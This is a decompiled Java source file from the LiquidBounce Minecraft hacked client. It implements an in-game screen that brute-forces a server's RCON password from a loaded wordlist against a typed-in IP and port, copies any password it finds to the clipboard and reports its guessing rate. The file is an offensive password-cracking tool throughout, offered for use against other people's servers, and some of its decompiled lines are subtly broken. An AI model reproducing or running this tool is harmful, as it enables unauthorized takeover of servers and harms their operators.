// 
// Decompiled by Procyon v0.5.36
// 

package net.ccbluex.liquidbounce.ui.tools;

import java.io.IOException;
import java.io.File;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.awt.HeadlessException;
import javax.swing.JDialog;
import java.awt.Component;
import javax.swing.JFileChooser;
import net.minecraft.client.gui.FontRenderer;
import net.ccbluex.liquidbounce.ui.font.Fonts;
import org.lwjgl.input.Keyboard;
import net.kronos.rkon.core.exceptions.AuthenticationException;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.StringSelection;
import java.awt.Toolkit;
import net.kronos.rkon.core.Rcon;
import java.util.ArrayList;
import java.util.List;
import net.ccbluex.liquidbounce.utils.threading.ToggleableLoop;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiTextField;
import net.minecraft.client.gui.GuiScreen;

public class GuiRconBruteforce extends GuiScreen
{
    private GuiTextField ipField;
    private GuiButton buttonToggle;
    private ToggleableLoop thread;
    private final GuiScreen prevGui;
    private final List<String> passwordList;
    private int index;
    private int pps;
    private int ppsDisplay;
    private long prevReset;
    private String status;
    
    public GuiRconBruteforce(final GuiScreen prevGui) {
        this.passwordList = new ArrayList<String>();
        this.status = "§7Wating...";
        this.prevGui = prevGui;
        String[] ip;
        String password;
        final Rcon rcon2;
        Rcon rcon;
        this.thread = new ToggleableLoop(() -> {
            try {
                if (this.index < this.passwordList.size()) {
                    ip = this.ipField.func_146179_b().split(":");
                    password = this.passwordList.get(this.index);
                    this.status = "§cTesting §a§l" + password + " §c on §a§l" + ip[0] + ":" + ((ip.length <= 1) ? "25575" : ip[1]) + " §7(§c" + this.index + "/" + this.passwordList.size() + "§7)";
                    try {
                        new Rcon(ip[0], (ip.length <= 1) ? 25575 : Integer.parseInt(ip[1]), password.getBytes("UTF-8"));
                        rcon = rcon2;
                        rcon.disconnect();
                        this.status = "§cPassword: §a§l" + password;
                        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(password), null);
                        this.thread.stopThread();
                    }
                    catch (AuthenticationException ex) {}
                    catch (Exception e) {
                        this.status = "§a§l" + e.getClass().getSimpleName() + ": §c" + e.getMessage();
                    }
                    ++this.pps;
                    if (System.currentTimeMillis() - this.prevReset > 1000L) {
                        this.ppsDisplay = this.pps;
                        this.pps = 0;
                        this.prevReset = System.currentTimeMillis();
                    }
                }
                else {
                    this.thread.stopThread();
                    this.status = "§a§lNo password found.";
                }
                ++this.index;
            }
            catch (Exception e2) {
                this.status = "§a§l" + e2.getClass().getSimpleName() + ": §c" + e2.getMessage();
            }
        }, "RCON-BruteForce");
    }
    
    public void func_73866_w_() {
        Keyboard.enableRepeatEvents(true);
        (this.ipField = new GuiTextField(3, (FontRenderer)Fonts.font40, this.field_146294_l / 2 - 100, 60, 200, 20)).func_146195_b(true);
        this.ipField.func_146203_f(Integer.MAX_VALUE);
        this.field_146292_n.add(this.buttonToggle = new GuiButton(1, this.field_146294_l / 2 - 100, this.field_146295_m / 4 + 72, this.thread.isRunning() ? "Stop" : "Start"));
        this.field_146292_n.add(new GuiButton(2, this.field_146294_l / 2 - 100, this.field_146295_m / 4 + 96, "Choose password list"));
        this.field_146292_n.add(new GuiButton(0, this.field_146294_l / 2 - 100, this.field_146295_m / 4 + 120, "Back"));
        super.func_73866_w_();
    }
    
    public void func_73863_a(final int mouseX, final int mouseY, final float partialTicks) {
        this.func_146278_c(0);
        this.func_73732_a((FontRenderer)Fonts.font40, "BruteForce (RCON)", this.field_146294_l / 2, 34, 16777215);
        this.func_73732_a((FontRenderer)Fonts.font35, (this.status == null) ? "" : this.status, this.field_146294_l / 2, this.field_146295_m / 4 + 50, 16777215);
        this.func_73732_a((FontRenderer)Fonts.font35, "PPS: " + this.ppsDisplay, this.field_146294_l / 2, this.field_146295_m / 4 + 60, 16777215);
        this.buttonToggle.field_146126_j = (this.thread.isRunning() ? "Stop" : "Start");
        this.ipField.func_146194_f();
        super.func_73863_a(mouseX, mouseY, partialTicks);
    }
    
    protected void func_146284_a(final GuiButton button) throws IOException {
        switch (button.field_146127_k) {
            case 0: {
                this.field_146297_k.func_147108_a(this.prevGui);
                break;
            }
            case 1: {
                this.index = 0;
                if (this.thread.isRunning()) {
                    this.thread.stopThread();
                }
                else {
                    this.thread.startThread();
                }
                this.buttonToggle.field_146126_j = (this.thread.isRunning() ? "Stop" : "Start");
                this.pps = 0;
                this.ppsDisplay = 0;
                break;
            }
            case 2: {
                final JFileChooser jFileChooser = new JFileChooser() {
                    @Override
                    protected JDialog createDialog(final Component parent) throws HeadlessException {
                        final JDialog jDialog = super.createDialog(parent);
                        jDialog.setAlwaysOnTop(true);
                        return jDialog;
                    }
                };
                jFileChooser.setFileSelectionMode(0);
                if (jFileChooser.showOpenDialog(null) != 0) {
                    break;
                }
                final File file = jFileChooser.getSelectedFile();
                if (file.isDirectory()) {
                    return;
                }
                final BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
                synchronized (this.passwordList) {
                    this.passwordList.clear();
                }
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    synchronized (this.passwordList) {
                        this.passwordList.add(line);
                    }
                }
                bufferedReader.close();
                break;
            }
        }
        super.func_146284_a(button);
    }
    
    protected void func_73869_a(final char typedChar, final int keyCode) throws IOException {
        if (1 == keyCode) {
            this.field_146297_k.func_147108_a(this.prevGui);
            return;
        }
        if (this.ipField.func_146206_l()) {
            this.ipField.func_146201_a(typedChar, keyCode);
        }
        super.func_73869_a(typedChar, keyCode);
    }
    
    protected void func_73864_a(final int mouseX, final int mouseY, final int mouseButton) throws IOException {
        this.ipField.func_146192_a(mouseX, mouseY, mouseButton);
        super.func_73864_a(mouseX, mouseY, mouseButton);
    }
    
    public void func_146281_b() {
        Keyboard.enableRepeatEvents(false);
        this.thread.stopThread();
        super.func_146281_b();
    }
}
